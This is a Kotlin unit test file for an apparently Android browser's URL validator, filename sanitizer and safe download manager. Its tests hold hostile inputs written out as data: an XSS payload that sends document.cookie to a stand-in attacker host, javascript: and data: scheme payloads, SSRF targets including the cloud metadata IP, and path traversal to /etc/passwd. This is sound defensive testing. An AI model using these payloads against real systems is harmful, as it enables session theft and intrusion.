package com.example

import com.example.model.DownloadLifecycleState
import com.example.model.SearchProvider
import com.example.security.SafeDownloadManager
import com.example.security.UrlSecurityValidator
import com.example.security.UrlValidationResult
import kotlinx.coroutines.runBlocking
import okhttp3.Interceptor
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Protocol
import okhttp3.Response
import okhttp3.ResponseBody.Companion.toResponseBody
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class ExampleUnitTest {

    @Test
    fun `malicious schemes javascript file data vbscript intent are rejected`() {
        val maliciousInputs = listOf(
            "javascript:alert(document.cookie)",
            "  java\nscript:fetch('https://evil.example')",
            "file:///etc/passwd",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)",
            "intent://scan/#Intent;scheme=zxing;end"
        )
        for (input in maliciousInputs) {
            val result = UrlSecurityValidator.validateSearchOrNavigation(
                rawInput = input,
                provider = SearchProvider.DUCKDUCKGO_HTML
            )
            assertTrue("Expected $input to be rejected", result is UrlValidationResult.Rejected)
        }
    }

    @Test
    fun `ssrf private loopback and cloud metadata hosts are rejected`() {
        val ssrfTargets = listOf(
            "https://localhost/admin",
            "https://127.0.0.1:8080/config",
            "https://10.0.0.1/internal",
            "https://172.16.0.5/secret",
            "https://192.168.1.1/router",
            "https://169.254.169.254/latest/meta-data/",
            "https://[::1]/loopback",
            "https://intranet.local/dashboard"
        )
        for (target in ssrfTargets) {
            val result = UrlSecurityValidator.validateDirectUrl(
                rawUrl = target,
                enforceHttpsOnly = true,
                blockPrivateNetworkSsrf = true
            )
            assertTrue("Expected SSRF target $target to be blocked", result is UrlValidationResult.Rejected)
        }
    }

    @Test
    fun `cleartext http is rejected when strict https is enabled`() {
        val result = UrlSecurityValidator.validateDirectUrl(
            rawUrl = "http://example.com/login",
            enforceHttpsOnly = true
        )
        assertTrue(result is UrlValidationResult.Rejected)
    }

    @Test
    fun `tracking query parameters are stripped while preserving legitimate parameters`() {
        val result = UrlSecurityValidator.validateDirectUrl(
            rawUrl = "https://example.org/docs?page=3&utm_source=newsletter&fbclid=abc123&gclid=xyz987&lang=en",
            enforceHttpsOnly = true,
            blockPrivateNetworkSsrf = true,
            stripTrackingParams = true
        )
        assertTrue(result is UrlValidationResult.ValidDirectUrl)
        val valid = result as UrlValidationResult.ValidDirectUrl
        assertEquals("https://example.org/docs?page=3&lang=en", valid.normalizedUrl)
        assertEquals(3, valid.strippedTrackingParamsCount)
    }

    @Test
    fun `filename sanitization blocks path traversal bidi override and flags deceptive executables`() {
        val traversal = UrlSecurityValidator.classifyAndSanitizeDownload(
            rawFileNameOrUrl = "../../../../etc/passwd",
            contentTypeHeader = "text/plain"
        )
        assertFalse(traversal.sanitizedFileName.contains(".."))
        assertFalse(traversal.sanitizedFileName.contains("/"))

        val deceptiveDoubleExt = UrlSecurityValidator.classifyAndSanitizeDownload(
            rawFileNameOrUrl = "https://example.com/files/annual_report.pdf.exe",
            contentTypeHeader = "application/octet-stream"
        )
        assertTrue(deceptiveDoubleExt.isExecutableOrDangerous)
        assertNotNull(deceptiveDoubleExt.warningReason)

        val apkFile = UrlSecurityValidator.classifyAndSanitizeDownload(
            rawFileNameOrUrl = "https://example.com/app-release.apk",
            contentTypeHeader = "application/vnd.android.package-archive"
        )
        assertTrue(apkFile.isExecutableOrDangerous)

        val safeTxt = UrlSecurityValidator.classifyAndSanitizeDownload(
            rawFileNameOrUrl = "https://www.rfc-editor.org/rfc/rfc9116.txt",
            contentTypeHeader = "text/plain"
        )
        assertEquals("rfc9116.txt", safeTxt.sanitizedFileName)
        assertFalse(safeTxt.isExecutableOrDangerous)
    }

    @Test
    fun `sandboxed document preview html escapes xss payloads and embeds strict csp`() {
        val xssPayload = "<script>fetch('https://attacker.tld/?c='+document.cookie)</script><img src=x onerror=alert(1)>"
        val previewHtml = UrlSecurityValidator.buildSandboxedDocumentPreviewHtml(
            title = "Test </title><script>alert(1)</script>",
            rawBody = xssPayload,
            isDark = true
        )
        assertFalse(previewHtml.contains("<script>fetch"))
        assertTrue(previewHtml.contains("&lt;script&gt;fetch"))
        assertTrue(previewHtml.contains("default-src 'none'"))
        assertTrue(previewHtml.contains("script-src 'none'"))
        assertTrue(previewHtml.contains("connect-src 'none'"))
    }

    @Test
    fun `safe download manager blocks unsafe redirect to internal network or http`() = runBlocking {
        val fakeRedirectClient = OkHttpClient.Builder()
            .followRedirects(false)
            .followSslRedirects(false)
            .addInterceptor(Interceptor { chain ->
                Response.Builder()
                    .request(chain.request())
                    .protocol(Protocol.HTTP_2)
                    .code(302)
                    .message("Found")
                    .header("Location", "https://127.0.0.1/internal-secret.txt")
                    .body("".toResponseBody("text/plain".toMediaType()))
                    .build()
            })
            .build()

        val manager = SafeDownloadManager(fakeRedirectClient)
        val finalItem = manager.executeSafeDownload(
            taskId = "test-redirect-ssrf",
            initialUrl = "https://example.com/public-file.txt",
            userConfirmedExecutable = false,
            onUpdate = {}
        )

        assertEquals(DownloadLifecycleState.FAILED, finalItem.state)
        assertTrue(finalItem.errorMessage?.contains("SSRF", ignoreCase = true) == true)
    }

    @Test
    fun `safe download manager requires explicit confirmation for executable files before network call`() = runBlocking {
        var networkCalled = false
        val trackingClient = OkHttpClient.Builder()
            .addInterceptor(Interceptor { chain ->
                networkCalled = true
                Response.Builder()
                    .request(chain.request())
                    .protocol(Protocol.HTTP_2)
                    .code(200)
                    .message("OK")
                    .body("binary".toResponseBody("application/octet-stream".toMediaType()))
                    .build()
            })
            .build()

        val manager = SafeDownloadManager(trackingClient)
        val unconfirmedResult = manager.executeSafeDownload(
            taskId = "test-exe-gate",
            initialUrl = "https://example.com/installer.exe",
            userConfirmedExecutable = false,
            onUpdate = {}
        )

        assertEquals(DownloadLifecycleState.AWAITING_EXECUTABLE_CONFIRMATION, unconfirmedResult.state)
        assertFalse("Network request must not fire before user confirms executable download", networkCalled)
        assertNull(unconfirmedResult.savedMemoryBuffer)
    }
}
